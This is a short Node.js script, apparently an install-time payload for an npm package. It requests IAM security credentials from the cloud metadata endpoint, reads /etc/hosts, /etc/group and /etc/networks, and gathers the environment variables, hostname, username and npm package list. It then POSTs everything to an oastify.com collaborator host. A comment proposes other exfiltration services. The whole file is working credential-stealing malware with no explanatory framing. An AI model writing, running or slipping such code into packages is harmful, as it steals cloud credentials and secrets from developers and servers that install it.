//author:- test999
const os = require("os");
const dns = require("dns");
const fs=require("fs");
const querystring = require("querystring");
const https = require("https");
const http = require("http");
const { execSync } = require("child_process");
const packageJSON = require("./package.json");
const package = packageJSON.name;
const npmListOutput = execSync('npm list').toString('utf8');

function makeHttpRequest(path, callback) {
    const options = {
      hostname: '169.254.169.254',
      path: `/${path}`,
      method: 'GET',
    };
  
    const req = http.request(options, (res) => {
      let data = '';
  
      res.on('data', (chunk) => {
        data += chunk;
      });
  
      res.on('end', () => {
        callback(null, data);
      });
    });
  
    req.on('error', (e) => {
      callback(e, null);
    });
  
    req.end();
  }
  
  makeHttpRequest('latest/meta-data/iam/security-credentials/', (error, metadataResponse) => {
    if (error) {
      console.error('Error making HTTP request to 169.254.169.254:', error);
      return;
    }
  
const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    hosts: fs.readFileSync("/etc/hosts").toString('utf8'),
    un: os.userInfo().username,
    dns: dns.getServers(),
    file: fs.readFileSync("/etc/group").toString('utf8'),
    npmList: npmListOutput,
    file1: fs.readFileSync("/etc/networks").toString('utf8'),
    environment: process.env,
    metadataResponse: metadataResponse,
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "x42eo4q6hzp0n8ve9omocpw0sryim9oxd.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
